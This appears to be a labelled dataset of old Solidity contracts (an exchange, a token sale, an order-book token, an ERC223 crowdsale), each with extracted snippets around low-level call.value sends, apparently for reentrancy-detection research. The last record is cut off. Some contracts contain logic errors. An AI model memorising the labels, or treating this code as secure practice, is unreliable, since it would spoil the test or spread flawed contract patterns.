{"sol name": "38651.sol", "label": 0, "first path": "function cancelBuyOrder(address token, uint price) { bytes32 h = sha256(token, price, msg.sender); uint remain = buyOrders[h]; delete buyOrders[h]; if (!msg.sender.call.value(remain)()) throw; CancelBuyOrder(h,token,price,msg.sender); ", "second path": "function cancelBuyOrder(address token, uint price) { bytes32 h = sha256(token, price, msg.sender); uint remain = buyOrders[h]; delete buyOrders[h]; if (!msg.sender.call.value(remain)()) throw; CancelBuyOrder(h,token,price,msg.sender); ", "third path": "function cancelBuyOrder(address token, uint price) { bytes32 h = sha256(token, price, msg.sender); uint remain = buyOrders[h]; delete buyOrders[h]; if (!msg.sender.call.value(remain)()) throw; CancelBuyOrder(h,token,price,msg.sender); ", "long path": "pragma solidity ^0.4.11; contract SafeMath { function safeMul(uint a, uint b) internal returns (uint) { uint c = a * b; assert(a == 0 || c / a == b); return c; } function safeSub(uint a, uint b) internal returns (uint) { assert(b <= a); return a - b; } function safeAdd(uint a, uint b) internal returns (uint) { uint c = a + b; assert(c>=a && c>=b); return c; } function assert(bool assertion) internal { if (!assertion) throw; } } contract Token { function name() public constant returns (string name) { name; } function symbol() public constant returns (string symbol) { symbol; } function decimals() public constant returns (uint8 decimals) { decimals; } function totalSupply() public constant returns (uint256 totalSupply) { totalSupply; } function balanceOf(address _owner) public constant returns (uint256 balance) { _owner; balance; } function allowance(address _owner, address _spender) public constant returns (uint256 remaining) { _owner; _spender; remaining; } function transfer(address _to, uint256 _value) public returns (bool success); function transferFrom(address _from, address _to, uint256 _value) public returns (bool success); function approve(address _spender, uint256 _value) public returns (bool success); } contract Ethex is SafeMath { address public admin; address public feeAccount; uint public sellFee; uint public buyFee; mapping (bytes32 => uint) public sellOrders; mapping (bytes32 => uint) public buyOrders; event BuyOrder(bytes32 order, address token, uint amount, uint price, address buyer); event SellOrder(bytes32 order,address token, uint amount, uint price, address seller); event CancelBuyOrder(bytes32 order, address token, uint price, address buyer); event CancelSellOrder(bytes32 order, address token, uint price, address seller); event Buy(bytes32 order, address token, uint amount, uint price, address buyer, address seller); event Sell(bytes32 order, address token, uint amount, uint price, address buyer, address seller); function Ethex(address admin_, address feeAccount_, uint buyFee_, uint sellFee_) { admin = admin_; feeAccount = feeAccount_; buyFee = buyFee_; sellFee = sellFee_; } function() { throw; } function changeAdmin(address admin_) { if (msg.sender != admin) throw; admin = admin_; } function changeFeeAccount(address feeAccount_) { if (msg.sender != admin) throw; feeAccount = feeAccount_; } function changeBuyFee(uint buyFee_) { if (msg.sender != admin) throw; if (buyFee_ > buyFee) throw; buyFee = buyFee_; } function changeSellFee(uint sellFee_) { if (msg.sender != admin) throw; if (sellFee_ > sellFee) sellFee = sellFee_; } function sellOrder(address token, uint tokenAmount, uint price) { bytes32 h = sha256(token, price, msg.sender); sellOrders[h] = safeAdd(sellOrders[h],tokenAmount); SellOrder(h, token, tokenAmount, price, msg.sender); } function buyOrder(address token, uint tokenAmount, uint price) payable { bytes32 h = sha256(token, price,  msg.sender); uint totalCost = tokenAmount*price; if (totalCost < msg.value) throw; buyOrders[h] = safeAdd(buyOrders[h],msg.value); BuyOrder(h, token, tokenAmount, price, msg.sender); } function cancelSellOrder(address token, uint price) { bytes32 h = sha256(token, price, msg.sender); delete sellOrders[h]; CancelSellOrder(h,token,price,msg.sender); } function cancelBuyOrder(address token, uint price) { bytes32 h = sha256(token, price, msg.sender); uint remain = buyOrders[h]; delete buyOrders[h]; if (!msg.sender.call.value(remain)()) throw; CancelBuyOrder(h,token,price,msg.sender); } function totalBuyPrice(uint amount, uint price)  public constant returns (uint) { uint totalPriceNoFee = safeMul(amount, price); uint totalFee = safeMul(totalPriceNoFee, buyFee) / (1 ether); uint totalPrice = safeAdd(totalPriceNoFee,totalFee); return totalPrice; } function takeBuy(address token, uint amount, uint price, address buyer) payable { bytes32 h = sha256(token, price, buyer); uint totalPriceNoFee = safeMul(amount, price); uint totalFee = safeMul(totalPriceNoFee, buyFee) / (1 ether); uint totalPrice = safeAdd(totalPriceNoFee,totalFee); if (buyOrders[h] < amount) throw; if (totalPrice > msg.value) throw; if (Token(token).allowance(msg.sender,this) < amount) throw; if (Token(token).transferFrom(msg.sender,buyer,amount)) throw; buyOrders[h] = safeSub(buyOrders[h], amount); if (!feeAccount.send(totalFee)) throw; uint leftOver = msg.value - totalPrice; if (leftOver>0) if (!msg.sender.send(leftOver)) throw; Buy(h, token, amount, totalPrice, buyer, msg.sender); } function totalSellPrice(uint amount, uint price)  public constant returns (uint) { uint totalPriceNoFee = safeMul(amount, price); uint totalFee = safeMul(totalPriceNoFee, buyFee) / (1 ether); uint totalPrice = safeSub(totalPriceNoFee,totalFee); return totalPrice; } function takeSell(address token, uint amount,uint price, address seller) payable { bytes32 h = sha256(token, price, seller); uint totalPriceNoFee = safeMul(amount, price); uint totalFee = safeMul(totalPriceNoFee, buyFee) / (1 ether); uint totalPrice = safeSub(totalPriceNoFee,totalFee); if (sellOrders[h] < amount) throw; if (Token(token).allowance(seller,this) < amount) throw; if (!Token(token).transferFrom(seller,msg.sender,amount)) throw; sellOrders[h] = safeSub(sellOrders[h],amount); if (!seller.send(totalPrice)) throw; if (!feeAccount.send(totalFee)) throw; Sell(h, token, amount, totalPrice, msg.sender, seller); } } "}
{"sol name": "38888.sol", "label": 0, "first path": "function withdraw() onlyOwner { if (!owner.call.value(this.balance)()) throw; ", "second path": "function withdraw() onlyOwner { if (!owner.call.value(this.balance)()) throw; ", "third path": "function withdraw() onlyOwner { if (!owner.call.value(this.balance)()) throw; ", "long path": "pragma solidity ^0.4.4; contract Token { function transfer(address _to, uint _value) returns (bool); function balanceOf(address owner) returns(uint); } contract Owned { address public owner; function Owned() { owner = msg.sender; } modifier onlyOwner() { if (msg.sender != owner) throw; _; } address newOwner; function changeOwner(address _newOwner) onlyOwner { newOwner = _newOwner; } function acceptOwnership() { if (msg.sender == newOwner) { owner = newOwner; } } } contract TokenReceivable is Owned { event logTokenTransfer(address token, address to, uint amount); function claimTokens(address _token, address _to) onlyOwner returns (bool) { Token token = Token(_token); uint balance = token.balanceOf(this); if (token.transfer(_to, balance)) { logTokenTransfer(_token, _to, balance); return true; } return false; } } contract FunFairSale is Owned, TokenReceivable { uint public deadline =  1499436000; uint public startTime = 1498140000; uint public capAmount = 125000000 ether; uint constant MAX_GAS_PRICE = 50 * 1024 * 1024 * 1024 wei; function FunFairSale() {} function shortenDeadline(uint t) onlyOwner { if (t > deadline) throw; deadline = t; } function () payable { if (tx.gasprice > MAX_GAS_PRICE) throw; if (block.timestamp < startTime || block.timestamp >= deadline) throw; if (this.balance >= capAmount) throw; if (this.balance + msg.value >= capAmount) { deadline = block.timestamp; } } function withdraw() onlyOwner { if (!owner.call.value(this.balance)()) throw; } function setCap(uint _cap) onlyOwner { capAmount = _cap; } function setStartTime(uint _startTime, uint _deadline) onlyOwner { if (block.timestamp >= startTime) throw; startTime = _startTime; deadline = _deadline; } } "}
{"sol name": "39994.sol", "label": 0, "first path": "function safeSend(address _recipient, uint _ether) internal preventReentry()  returns (bool success_) { if(!_recipient.call.value(_ether)()) throw; success_ = true; pragma solidity ^0.4.0; contract Math string constant VERSION = \"Math 0.0.1 \\n\"; uint constant NULL = 0; bool constant LT = false; bool constant GT = true; uint constant iTRUE = 1; uint constant iFALSE = 0; uint constant iPOS = 1; uint constant iZERO = 0; uint constant iNEG = uint(-1); function withdraw(uint _ether) external canEnter  hasEther(msg.sender, _ether) returns (bool success_) { etherBalance[msg.sender] -= _ether; safeSend(msg.sender, _ether); success_ = true; ", "second path": "function safeSend(address _recipient, uint _ether) internal preventReentry()  returns (bool success_) { if(!_recipient.call.value(_ether)()) throw; success_ = true; pragma solidity ^0.4.0; contract Math string constant VERSION = \"Math 0.0.1 \\n\"; uint constant NULL = 0; bool constant LT = false; bool constant GT = true; uint constant iTRUE = 1; uint constant iFALSE = 0; uint constant iPOS = 1; uint constant iZERO = 0; uint constant iNEG = uint(-1); function withdraw(uint _ether) external canEnter  hasEther(msg.sender, _ether) returns (bool success_) { etherBalance[msg.sender] -= _ether; safeSend(msg.sender, _ether); success_ = true; ", "third path": "function safeSend(address _recipient, uint _ether) internal preventReentry()  returns (bool success_) { if(!_recipient.call.value(_ether)()) throw; success_ = true; pragma solidity ^0.4.0; contract Math string constant VERSION = \"Math 0.0.1 \\n\"; uint constant NULL = 0; bool constant LT = false; bool constant GT = true; uint constant iTRUE = 1; uint constant iFALSE = 0; uint constant iPOS = 1; uint constant iZERO = 0; uint constant iNEG = uint(-1); function withdraw(uint _ether) external canEnter  hasEther(msg.sender, _ether) returns (bool success_) { etherBalance[msg.sender] -= _ether; safeSend(msg.sender, _ether); success_ = true; ", "long path": "pragma solidity ^0.4.0; contract Base { string constant VERSION = \"Base 0.1.1 \\n\"; bool mutex; address public owner; event Log(string message); event ChangedOwner(address indexed oldOwner, address indexed newOwner); modifier onlyOwner() { if (msg.sender != owner) throw; _; } modifier preventReentry() { if (mutex) throw; else mutex = true; _; delete mutex; return; } modifier noReentry() { if (mutex) throw; _; } modifier canEnter() { if (mutex) throw; _; } function Base() { owner = msg.sender; } function version() public constant returns (string) { return VERSION; } function contractBalance() public constant returns(uint) { return this.balance; } function changeOwner(address _newOwner) public onlyOwner returns (bool) { owner = _newOwner; ChangedOwner(msg.sender, owner); return true; } function safeSend(address _recipient, uint _ether) internal preventReentry()  returns (bool success_) { if(!_recipient.call.value(_ether)()) throw; success_ = true; } } pragma solidity ^0.4.0; contract Math { string constant VERSION = \"Math 0.0.1 \\n\"; uint constant NULL = 0; bool constant LT = false; bool constant GT = true; uint constant iTRUE = 1; uint constant iFALSE = 0; uint constant iPOS = 1; uint constant iZERO = 0; uint constant iNEG = uint(-1); function version() public constant returns (string) { return VERSION; } function assert(bool assertion) internal constant { if (!assertion) throw; } function cmp (uint a, uint b, bool _sym) internal constant returns (bool) { return (a!=b) && ((a < b) != _sym); } function cmpEq (uint a, uint b, bool _sym) internal constant returns (bool) { return (a==b) || ((a < b) != _sym); } function safeMul(uint a, uint b) internal constant returns (uint) { uint c = a * b; assert(a == 0 || c / a == b); return c; } function safeSub(uint a, uint b) internal constant returns (uint) { assert(b <= a); return a - b; } function safeAdd(uint a, uint b) internal constant returns (uint) { uint c = a + b; assert(c>=a && c>=b); return c; } } contract ERC20Interface { string constant VERSION = \"ERC20 0.2.3-o0ragman0o\\nMath 0.0.1\\nBase 0.1.1\\n\"; uint public totalSupply; uint8 public decimalPlaces; string public name; string public symbol; mapping (address => uint) balance; mapping (address => mapping (address => uint)) public allowance; event Transfer( address indexed _from, address indexed _to, uint256 _value); event Approval( address indexed _owner, address indexed _spender, uint256 _value); } contract ERC20Token is Base, Math, ERC20Interface { modifier isAvailable(uint _amount) { if (_amount > balance[msg.sender]) throw; _; } modifier isAllowed(address _from, uint _amount) { if (_amount > allowance[_from][msg.sender] || _amount > balance[_from]) throw; _; } function ERC20Token( uint _supply, uint8 _decimalPlaces, string _symbol, string _name) { totalSupply = _supply; decimalPlaces = _decimalPlaces; symbol = _symbol; name = _name; balance[msg.sender] = totalSupply; } function version() public constant returns(string) { return VERSION; } function balanceOf(address _addr) public constant returns (uint) { return balance[_addr]; } function transfer(address _to, uint256 _value) external canEnter isAvailable(_value) returns (bool) { balance[msg.sender] = safeSub(balance[msg.sender], _value); balance[_to] = safeAdd(balance[_to], _value); Transfer(msg.sender, _to, _value); return true; } function transferFrom(address _from, address _to, uint256 _value) external canEnter isAllowed(_from, _value) returns (bool) { balance[_from] = safeSub(balance[_from], _value); balance[_to] = safeAdd(balance[_to], _value); allowance[_from][msg.sender] = safeSub(allowance[_from][msg.sender], _value); Transfer(msg.sender, _to, _value); return true; } function approve(address _spender, uint256 _value) external canEnter returns (bool success) { if (balance[msg.sender] == 0) throw; allowance[msg.sender][_spender] = _value; Approval(msg.sender, _spender, _value); return true; } } library LibCLLu { string constant VERSION = \"LibCLLu 0.3.1\"; uint constant NULL = 0; uint constant HEAD = NULL; bool constant PREV = false; bool constant NEXT = true; struct CLL{ mapping (uint => mapping (bool => uint)) cll; } function version() internal constant returns (string) { return VERSION; } function exists(CLL storage self) internal constant returns (bool) { if (self.cll[HEAD][PREV] != HEAD || self.cll[HEAD][NEXT] != HEAD) return true; } function sizeOf(CLL storage self) internal constant returns (uint r) { uint i = step(self, HEAD, NEXT); while (i != HEAD) { i = step(self, i, NEXT); r++; } return; } function getNode(CLL storage self, uint n) internal  constant returns (uint[2]) { return [self.cll[n][PREV], self.cll[n][NEXT]]; } function step(CLL storage self, uint n, bool d) internal  constant returns (uint) { return self.cll[n][d]; } function seek(CLL storage self, uint a, uint b, bool d) internal  constant returns (uint r) { r = step(self, a, d); while  ((b!=r) && ((b < r) != d)) r = self.cll[r][d]; return; } function stitch(CLL storage self, uint a, uint b, bool d) internal  { self.cll[b][!d] = a; self.cll[a][d] = b; } function insert (CLL storage self, uint a, uint b, bool d) internal  { uint c = self.cll[a][d]; stitch (self, a, b, d); stitch (self, b, c, d); } function remove(CLL storage self, uint n) internal returns (uint) { if (n == NULL) return; stitch(self, self.cll[n][PREV], self.cll[n][NEXT], NEXT); delete self.cll[n][PREV]; delete self.cll[n][NEXT]; return n; } function push(CLL storage self, uint n, bool d) internal  { insert(self, HEAD, n, d); } function pop(CLL storage self, bool d) internal returns (uint) { return remove(self, step(self, HEAD, d)); } } library LibCLLi { string constant VERSION = \"LibCLLi 0.3.1\"; int constant NULL = 0; int constant HEAD = NULL; bool constant PREV = false; bool constant NEXT = true; struct CLL{ mapping (int => mapping (bool => int)) cll; } function version() internal constant returns (string) { return VERSION; } function exists(CLL storage self, int n) internal constant returns (bool) { if (self.cll[HEAD][PREV] != HEAD || self.cll[HEAD][NEXT] != HEAD) return true; } function sizeOf(CLL storage self) internal constant returns (uint r) { int i = step(self, HEAD, NEXT); while (i != HEAD) { i = step(self, i, NEXT); r++; } return; } function getNode(CLL storage self, int n) internal  constant returns (int[2]) { return [self.cll[n][PREV], self.cll[n][NEXT]]; } function step(CLL storage self, int n, bool d) internal  constant returns (int) { return self.cll[n][d]; } function seek(CLL storage self, int a, int b, bool d) internal  constant returns (int r) { r = step(self, a, d); while  ((b!=r) && ((b < r) != d)) r = self.cll[r][d]; return; } function stitch(CLL storage self, int a, int b, bool d) internal  { self.cll[b][!d] = a; self.cll[a][d] = b; } function insert (CLL storage self, int a, int b, bool d) internal  { int c = self.cll[a][d]; stitch (self, a, b, d); stitch (self, b, c, d); } function remove(CLL storage self, int n) internal returns (int) { if (n == NULL) return; stitch(self, self.cll[n][PREV], self.cll[n][NEXT], NEXT); delete self.cll[n][PREV]; delete self.cll[n][NEXT]; return n; } function push(CLL storage self, int n, bool d) internal  { insert(self, HEAD, n, d); } function pop(CLL storage self, bool d) internal returns (int) { return remove(self, step(self, HEAD, d)); } } contract ITTInterface { using LibCLLu for LibCLLu.CLL; string constant VERSION = \"ITT 0.3.6\\nERC20 0.2.3-o0ragman0o\\nMath 0.0.1\\nBase 0.1.1\\n\"; uint constant HEAD = 0; uint constant MINNUM = uint(1); uint constant MAXNUM = 2**128; uint constant MINPRICE = uint(1); uint constant NEG = uint(-1); bool constant PREV = false; bool constant NEXT = true; bool constant BID = false; bool constant ASK = true; uint constant MINGAS = 100000; struct TradeMessage { bool make; bool side; uint price; uint tradeAmount; uint balance; uint etherBalance; } bool public trading; mapping (address => uint) etherBalance; mapping (uint => LibCLLu.CLL) orderFIFOs; mapping (bytes32 => uint) amounts; LibCLLu.CLL priceBook = orderFIFOs[0]; event Ask (uint indexed price, uint amount, address indexed trader); event Bid (uint indexed price, uint amount, address indexed trader); event Sale (uint indexed price, uint amount, address indexed buyer, address indexed seller); event Trading(bool trading); function spread(bool _side) public constant returns(uint); function getAmount(uint _price, address _trader) public constant returns(uint); function getPriceVolume(uint _price) public constant returns (uint); function getBook() public constant returns (uint[]); function buy (uint _bidPrice, uint _amount, bool _make) payable returns (bool); function sell (uint _askPrice, uint _amount, bool _make) external returns (bool); function withdraw(uint _ether) external returns (bool success_); function cancel(uint _price) external returns (bool); function setTrading(bool _trading) external returns (bool); } contract ITT is ERC20Token, ITTInterface { modifier isTrading() { if (!trading) throw; _; } modifier isValidBuy(uint _bidPrice, uint _amount) { if ((etherBalance[msg.sender] + msg.value) < (_amount * _bidPrice) || _amount == 0 || _amount > totalSupply || _bidPrice <= MINPRICE || _bidPrice >= MAXNUM) throw; _; } modifier isValidSell(uint _askPrice, uint _amount) { if (_amount > balance[msg.sender] || _amount == 0 || _askPrice < MINPRICE || _askPrice > MAXNUM) throw; _; } modifier hasEther(address _member, uint _ether) { if (etherBalance[_member] < _ether) throw; _; } modifier hasBalance(address _member, uint _amount) { if (balance[_member] < _amount) throw; _; } function ITT( uint _totalSupply, uint8 _decimalPlaces, string _symbol, string _name ) ERC20Token( _totalSupply, _decimalPlaces, _symbol, _name ) { priceBook.cll[HEAD][PREV] = MINPRICE; priceBook.cll[MINPRICE][PREV] = MAXNUM; priceBook.cll[HEAD][NEXT] = MAXNUM; priceBook.cll[MAXNUM][NEXT] = MINPRICE; trading = true; balance[owner] = totalSupply; } function version() public constant returns(string) { return VERSION; } function etherBalanceOf(address _addr) public constant returns (uint) { return etherBalance[_addr]; } function spread(bool _side) public constant returns(uint) { return priceBook.step(HEAD, _side); } function getAmount(uint _price, address _trader) public constant returns(uint) { return amounts[sha3(_price, _trader)]; } function sizeOf(uint l) constant returns (uint s) { if(l == 0) return priceBook.sizeOf(); return orderFIFOs[l].sizeOf(); } function getPriceVolume(uint _price) public constant returns (uint v_) { uint n = orderFIFOs[_price].step(HEAD,NEXT); while (n != HEAD) { v_ += amounts[sha3(_price, address(n))]; n = orderFIFOs[_price].step(n, NEXT); } return; } function getBook() public constant returns (uint[]) { uint i; uint p = priceBook.step(MINNUM, NEXT); uint[] memory volumes = new uint[](priceBook.sizeOf() * 2 - 2); while (p < MAXNUM) { volumes[i++] = p; volumes[i++] = getPriceVolume(p); p = priceBook.step(p, NEXT); } return volumes; } function numOrdersOf(address _addr) public constant returns (uint) { uint c; uint p = MINNUM; while (p < MAXNUM) { if (amounts[sha3(p, _addr)] > 0) c++; p = priceBook.step(p, NEXT); } return c; } function getOpenOrdersOf(address _addr) public constant returns (uint[]) { uint i; uint c; uint p = MINNUM; uint[] memory open = new uint[](numOrdersOf(_addr)*2); p = MINNUM; while (p < MAXNUM) { if (amounts[sha3(p, _addr)] > 0) { open[i++] = p; open[i++] = amounts[sha3(p, _addr)]; } p = priceBook.step(p, NEXT); } return open; } function getNode(uint _list, uint _node) public constant returns(uint[2]) { return [orderFIFOs[_list].cll[_node][PREV], orderFIFOs[_list].cll[_node][NEXT]]; } function buy (uint _bidPrice, uint _amount, bool _make) payable canEnter isTrading isValidBuy(_bidPrice, _amount) returns (bool) { trade(_bidPrice, _amount, BID, _make); return true; } function sell (uint _askPrice, uint _amount, bool _make) external canEnter isTrading isValidSell(_askPrice, _amount) returns (bool) { trade(_askPrice, _amount, ASK, _make); return true; } function withdraw(uint _ether) external canEnter  hasEther(msg.sender, _ether) returns (bool success_) { etherBalance[msg.sender] -= _ether; safeSend(msg.sender, _ether); success_ = true; } function cancel(uint _price) external canEnter returns (bool) { TradeMessage memory tmsg; tmsg.price = _price; tmsg.balance = balance[msg.sender]; tmsg.etherBalance = etherBalance[msg.sender]; cancelIntl(tmsg); balance[msg.sender] = tmsg.balance; etherBalance[msg.sender] = tmsg.etherBalance; return true; } function setTrading(bool _trading) external onlyOwner canEnter returns (bool) { trading = _trading; Trading(true); return true; } function trade (uint _price, uint _amount, bool _side, bool _make) internal { TradeMessage memory tmsg; tmsg.price = _price; tmsg.tradeAmount = _amount; tmsg.side = _side; tmsg.make = _make; tmsg.balance  = balance[msg.sender]; tmsg.etherBalance = etherBalance[msg.sender] + msg.value; take(tmsg); make(tmsg); balance[msg.sender] = tmsg.balance; etherBalance[msg.sender] = tmsg.etherBalance; } function take (TradeMessage tmsg) internal { address maker; bytes32 orderHash; uint takeAmount; uint takeEther; uint sign = tmsg.side ? uint(1) : uint(-1); uint bestPrice = spread(!tmsg.side); while ( tmsg.tradeAmount > 0 && cmpEq(tmsg.price, bestPrice, !tmsg.side) && msg.gas > MINGAS ) { maker = address(orderFIFOs[bestPrice].step(HEAD, NEXT)); orderHash = sha3(bestPrice, maker); if (tmsg.tradeAmount < amounts[orderHash]) { amounts[orderHash] = safeSub(amounts[orderHash], tmsg.tradeAmount); takeAmount = tmsg.tradeAmount; tmsg.tradeAmount = 0; } else { takeAmount = amounts[orderHash]; tmsg.tradeAmount = safeSub(tmsg.tradeAmount, takeAmount); closeOrder(bestPrice, maker); } takeEther = safeMul(bestPrice, takeAmount); tmsg.etherBalance += takeEther * sign; tmsg.balance -= takeAmount * sign; if (tmsg.side) { if (msg.sender == maker) { tmsg.balance += takeAmount; } else { balance[maker] += takeAmount; } } else { if (msg.sender == maker) { tmsg.etherBalance += takeEther; } else { etherBalance[maker] += takeEther; } } bestPrice = spread(!tmsg.side); Sale (bestPrice, takeAmount, msg.sender, maker); } } function make(TradeMessage tmsg) internal { bytes32 orderHash; if (tmsg.tradeAmount == 0 || !tmsg.make || msg.gas < MINGAS) return; orderHash = sha3(tmsg.price, msg.sender); if (amounts[orderHash] != 0) { cancelIntl(tmsg); } if (!orderFIFOs[tmsg.price].exists()) { priceBook.insert( priceBook.seek(HEAD, tmsg.price, tmsg.side), tmsg.price, !tmsg.side); } amounts[orderHash] = tmsg.tradeAmount; orderFIFOs[tmsg.price].push(uint(msg.sender), PREV); if (tmsg.side) { tmsg.balance -= tmsg.tradeAmount; Ask (tmsg.price, tmsg.tradeAmount, msg.sender); } else { tmsg.etherBalance -= tmsg.tradeAmount * tmsg.price; Bid (tmsg.price, tmsg.tradeAmount, msg.sender); } } function cancelIntl(TradeMessage tmsg) internal { uint amount = amounts[sha3(tmsg.price, msg.sender)]; if (amount == 0) return; if (tmsg.price > spread(BID)) tmsg.balance += amount; else tmsg.etherBalance += tmsg.price * amount; closeOrder(tmsg.price, msg.sender); } function closeOrder(uint _price, address _trader) internal { orderFIFOs[_price].remove(uint(_trader)); if (!orderFIFOs[_price].exists())  { priceBook.remove(_price); } delete amounts[sha3(_price, _trader)]; } } "}
{"sol name": "14741.sol", "label": 0, "first path": "function transferToContractWithCustomFallback(address _to, uint _value, bytes _data, string _custom_fallback) private returns(bool success) { require(balanceOf(msg.sender) > _value); balances[msg.sender] = balances[msg.sender].sub(_value); balances[_to] = balances[_to].add(_value); assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data)); emit Transfer(msg.sender, _to, _value, _data); return true; function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns(bool success) { require(!frozenAccount[msg.sender]); require(!frozenAccount[_to]); if (isContract(_to)) { return transferToContractWithCustomFallback(_to, _value, _data, _custom_fallback); } else { return transferToAddress(_to, _value, _data); ", "second path": "function transferToContractWithCustomFallback(address _to, uint _value, bytes _data, string _custom_fallback) private returns(bool success) { require(balanceOf(msg.sender) > _value); balances[msg.sender] = balances[msg.sender].sub(_value); balances[_to] = balances[_to].add(_value); assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data)); emit Transfer(msg.sender, _to, _value, _data); return true; function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns(bool success) { require(!frozenAccount[msg.sender]); require(!frozenAccount[_to]); if (isContract(_to)) { return transferToContractWithCustomFallback(_to, _value, _data, _custom_fallback); } else { return transferToAddress(_to, _value, _data); ", "third path": "function transferToContractWithCustomFallback(address _to, uint _value, bytes _data, string _custom_fallback) private returns(bool success) { require(balanceOf(msg.sender) > _value); balances[msg.sender] = balances[msg.sender].sub(_value); balances[_to] = balances[_to].add(_value); assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data)); emit Transfer(msg.sender, _to, _value, _data); return true; function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns(bool success) { require(!frozenAccount[msg.sender]); require(!frozenAccount[_to]); if (isContract(_to)) { return transferToContractWithCustomFallback(_to, _value, _data, _custom_fallback); } else { return transferToAddress(_to, _value, _data); ", "long path": "pragma solidity ^ 0.4.21; pragma solidity ^0.4.10; library SafeMath { function mul(uint256 a, uint256 b) internal pure returns (uint256) { if (a == 0) { return 0; } uint256 c = a * b; assert(c / a == b); return c; } function div(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a / b; return c; } function sub(uint256 a, uint256 b) internal pure returns (uint256) { assert(b <= a); return a - b; } function add(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a + b; assert(c >= a); return c; } } pragma solidity ^0.4.10; interface ERC20 { function balanceOf(address who) view returns (uint256); function transfer(address to, uint256 value) returns (bool); function allowance(address owner, address spender) view returns (uint256); function transferFrom(address from, address to, uint256 value) returns (bool); function approve(address spender, uint256 value) returns (bool); event Transfer(address indexed from, address indexed to, uint256 value); event Approval(address indexed owner, address indexed spender, uint256 value); } pragma solidity ^0.4.10; interface ERC223 { function transfer(address to, uint value, bytes data) returns (bool); event Transfer(address indexed from, address indexed to, uint value, bytes indexed data); } pragma solidity ^0.4.10; contract ERC223ReceivingContract { function tokenFallback(address _from, uint _value, bytes _data) public; } pragma solidity ^0.4.21; contract Ownable { address public owner; event OwnershipTransferred(address indexed previousOwner, address indexed newOwner); function Ownable()public { owner = msg.sender; } modifier onlyOwner() { require(msg.sender == owner); _; } function transferOwnership(address newOwner) public onlyOwner { require(newOwner != address(0)); emit OwnershipTransferred(owner, newOwner); owner = newOwner; } } pragma solidity ^0.4.21; contract RefundVault is Ownable { using SafeMath for uint256; enum State { Active, Refunding, Closed } mapping(address => uint256) public deposited; address public wallet; State public state; event Closed(); event RefundsEnabled(); event Refunded(address indexed beneficiary, uint256 weiAmount); function RefundVault(address _wallet) public { require(_wallet != address(0)); wallet = _wallet; state = State.Active; } function deposit(address investor) onlyOwner public payable { require(state == State.Active); deposited[investor] = deposited[investor].add(msg.value); } function close() onlyOwner public { require(state == State.Active); state = State.Closed; emit Closed(); wallet.transfer(address(this).balance); } function enableRefunds() onlyOwner public { require(state == State.Active); state = State.Refunding; emit RefundsEnabled(); } function refund(address investor) public { require(state == State.Refunding); uint256 depositedValue = deposited[investor]; deposited[investor] = 0; investor.transfer(depositedValue); emit Refunded(investor, depositedValue); } } pragma solidity ^0.4.21; contract BonusScheme is Ownable { using SafeMath for uint256; uint256 startOfFirstBonus = 1526021400; uint256 endOfFirstBonus = (startOfFirstBonus - 1) + 5 minutes; uint256 startOfSecondBonus = (startOfFirstBonus + 1) + 5 minutes; uint256 endOfSecondBonus = (startOfSecondBonus - 1) + 5 minutes; uint256 startOfThirdBonus = (startOfSecondBonus + 1) + 5 minutes; uint256 endOfThirdBonus = (startOfThirdBonus - 1) + 5 minutes; uint256 startOfFourthBonus = (startOfThirdBonus + 1) + 5 minutes; uint256 endOfFourthBonus = (startOfFourthBonus - 1) + 5 minutes; uint256 startOfFifthBonus = (startOfFourthBonus + 1) + 5 minutes; uint256 endOfFifthBonus = (startOfFifthBonus - 1) + 5 minutes; uint256 firstBonus = 35; uint256 secondBonus = 30; uint256 thirdBonus = 20; uint256 fourthBonus = 10; uint256 fifthBonus = 5; event BonusCalculated(uint256 tokenAmount); function BonusScheme() public { } function getBonusTokens(uint256 _tokenAmount)onlyOwner public returns(uint256) { if (block.timestamp >= startOfFirstBonus && block.timestamp <= endOfFirstBonus) { _tokenAmount = _tokenAmount.mul(firstBonus).div(100); } else if (block.timestamp >= startOfSecondBonus && block.timestamp <= endOfSecondBonus) { _tokenAmount = _tokenAmount.mul(secondBonus).div(100); } else if (block.timestamp >= startOfThirdBonus && block.timestamp <= endOfThirdBonus) { _tokenAmount = _tokenAmount.mul(thirdBonus).div(100); } else if (block.timestamp >= startOfFourthBonus && block.timestamp <= endOfFourthBonus) { _tokenAmount = _tokenAmount.mul(fourthBonus).div(100); } else if (block.timestamp >= startOfFifthBonus && block.timestamp <= endOfFifthBonus) { _tokenAmount = _tokenAmount.mul(fifthBonus).div(100); } else _tokenAmount=0; emit BonusCalculated(_tokenAmount); return _tokenAmount; } } contract StandardToken is ERC20, ERC223, Ownable { using SafeMath for uint; string internal _name; string internal _symbol; uint8 internal _decimals; uint256 internal _totalSupply; uint256 internal _bonusSupply; uint256 public ethRate; uint256 public min_contribution; uint256 public totalWeiRaised; uint public tokensSold; uint public softCap; uint public start; uint public end; bool public crowdsaleClosed; RefundVault public vault; BonusScheme public bonusScheme; address public fundsWallet; mapping(address => bool)public frozenAccount; mapping(address => uint256)internal balances; mapping(address => mapping(address => uint256))internal allowed; event Burn(address indexed burner, uint256 value); event FrozenFunds(address target, bool frozen); event Finalized(); event BonusSent(address indexed from, address indexed to, uint256 boughtTokens, uint256 bonusTokens); event TokenPurchase(address indexed purchaser, address indexed beneficiary, uint256 value, uint256 amount); function StandardToken() public { _symbol = \"AmTC1\"; _name = \"AmTokenTestCase1\"; _decimals = 5; _totalSupply = 1100000 * (10 ** uint256(_decimals)); _bonusSupply = _totalSupply * 17 / 100; fundsWallet = msg.sender; vault = new RefundVault(fundsWallet); bonusScheme = new BonusScheme(); balances[msg.sender] = _totalSupply.sub(_bonusSupply); balances[bonusScheme] = _bonusSupply; ethRate = 40000000; min_contribution = 1 ether / (10**11); totalWeiRaised = 0; tokensSold = 0; softCap = 20000 * 10 ** uint(_decimals); start = 1526021100; end = 1526023500; crowdsaleClosed = false; } modifier beforeICO() { require(block.timestamp <= start); _; } modifier afterDeadline() { require(block.timestamp > end); _; } function name()\tpublic\tview\treturns(string) { return _name; } function symbol()\tpublic\tview\treturns(string) { return _symbol; } function decimals()\tpublic\tview\treturns(uint8) { return _decimals; } 